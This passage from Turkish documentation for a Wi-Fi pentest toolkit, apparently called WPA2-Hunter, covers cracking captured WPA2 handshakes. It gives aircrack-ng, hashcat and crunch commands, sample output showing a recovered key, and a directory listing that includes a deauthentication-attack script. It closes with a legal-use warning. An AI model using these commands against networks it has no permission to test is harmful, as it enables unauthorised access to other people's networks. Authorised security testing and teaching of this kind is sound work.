│  .cap Dosyası   │────►│  Wordlist       │────►│ Parola Bulundu! │
│  (Handshake)    │     │  (rockyou.txt)  │     │ veya Bulunamadı │
└─────────────────┘     └─────────────────┘     └─────────────────┘
```

### Wordlist Seçenekleri

| Seçenek | Dosya | Boyut | Kullanım |
|---------|-------|-------|----------|
| **1** | rockyou.txt | ~14M parola | Yaygın parolalar |
| **2** | Özel dosya | Değişken | Kendi wordlist'iniz |
| **3** | Crunch | Dinamik | Anlık oluştur |

### Kod Parçaları

#### Handshake Doğrulama
```bash
if ! aircrack-ng "$CAP_FILE" 2>&1 | grep -q "1 handshake"; then
    echo "[!] UYARI: Handshake bulunamadı veya geçersiz!"
fi
```

#### Rockyou.txt Hazırlama
```bash
ROCKYOU_PATH="/usr/share/wordlists/rockyou.txt"
if [ ! -f "$ROCKYOU_PATH" ]; then
    if [ -f "${ROCKYOU_PATH}.gz" ]; then
        gunzip "${ROCKYOU_PATH}.gz"  # Sıkıştırmayı aç
    fi
fi
```

#### Crunch ile Wordlist Oluşturma
```bash
crunch "$MIN_LEN" "$MAX_LEN" "$CHARSET" -o "$WORDLIST"
```
Örnek:
- `crunch 8 8 0123456789`: 8 haneli tüm sayısal kombinasyonlar
- Bu 10^8 = 100,000,000 olasılık demek!

#### Aircrack-ng ile Kırma
```bash
aircrack-ng -w "$WORDLIST" -b "$TARGET_BSSID" "$CAP_FILE"
```
- `-w`: Wordlist dosyası
- `-b`: Hedef BSSID
- CPU ile çalışır (~1,000 key/s)

#### Hashcat ile Kırma (Hızlı)
```bash
# 1. cap → hashcat formatına dönüştür
hcxpcapngtool -o "$HASH_FILE" "$CAP_FILE"

# 2. Hashcat çalıştır
hashcat -m 22000 -a 0 "$HASH_FILE" "$WORDLIST"

# 3. Sonucu göster
hashcat -m 22000 "$HASH_FILE" --show
```
- `-m 22000`: WPA-PBKDF2-PMKID+EAPOL mode
- `-a 0`: Dictionary attack
- GPU ile çalışır (~100,000+ key/s)

### Kullanım
```bash
sudo ./05-crack-password.sh
```

### Örnek Çalışma

```
[?] .cap dosya yolu: ../captures/capture-01.cap
[*] Handshake doğrulanıyor...

📚 Wordlist Seçimi
---
  1) Rockyou.txt (~14M parola - önerilen)
  2) Özel wordlist dosyası
  3) Crunch ile anlık oluştur

[?] Seçiminiz (1/2/3): 1

🔓 Kırma Yöntemi:
---
  1) Aircrack-ng (CPU - ~1,000 key/s)
  2) Hashcat (GPU - ~100,000+ key/s) [Önerilen]

[?] Seçiminiz (1/2): 2

[*] Hashcat ile kırma başlatıldı...

✅ KEY FOUND! [ password123 ]
```

### Performans Karşılaştırması

| Yöntem | 14M Wordlist Süresi |
|--------|---------------------|
| Aircrack-ng (CPU) | ~4 saat |
| Hashcat (GPU) | ~2-3 dakika |

---

## 🔧 Ortak Özellikler

### Tüm Scriptlerde Bulunan Kontroller

```bash
# 1. Root Yetki Kontrolü
if [ "$EUID" -ne 0 ]; then
    echo "Root yetkileri gerektirir!"
    exit 1
fi

# 2. set -e
set -e  # Herhangi bir hata durumunda scripti durdur

# 3. Geçici Dosyalar
/tmp/wpa2hunter_interface.conf      # Monitor interface adı
/tmp/wpa2hunter_target_bssid.conf   # Hedef AP MAC
/tmp/wpa2hunter_target_channel.conf # Hedef kanal
```

### Renk ve Emoji Kullanımı

| Sembol | Anlam |
|--------|-------|
| ✅ | Başarı |
| ❌ | Hata |
| ⚠️ | Uyarı |
| 📡 | Ağ/Tarama |
| 🎯 | Hedef |
| 💡 | İpucu |
| ▶️ | Sonraki adım |
| 🔓 | Parola/Kırma |
| 📚 | Wordlist |

---

## 📁 Dizin Yapısı

```
WPA2-Hunter/
├── scripts/
│   ├── 00-cleanup.sh
│   ├── 01-setup-monitor-mode.sh
│   ├── 02-scan-networks.sh
│   ├── 03-capture-handshake.sh
│   ├── 04-deauth-attack.sh
│   └── 05-crack-password.sh
├── captures/          # Yakalanan handshake dosyaları
├── wordlists/         # Özel wordlist'ler
└── docs/
    └── SCRIPTS_DOCUMENTATION.md  # Bu belge
```

---

## 🛡️ Güvenlik ve Etik

> **⚠️ UYARI: Bu araçlar YALNIZCA yasal amaçlarla kullanılmalıdır!**
>
> - ✅ Kendi ağınızı test edin
> - ✅ Yazılı izin alınmış penetrasyon testleri
> - ✅ Eğitim ve araştırma amaçlı (lab ortamında)
> - ❌ İzinsiz ağlara erişim YASA DIŞIDIR
> - ❌ Başkalarının trafiğini izlemek YASA DIŞIDIR

---

*Son güncelleme: 2025-12-25*
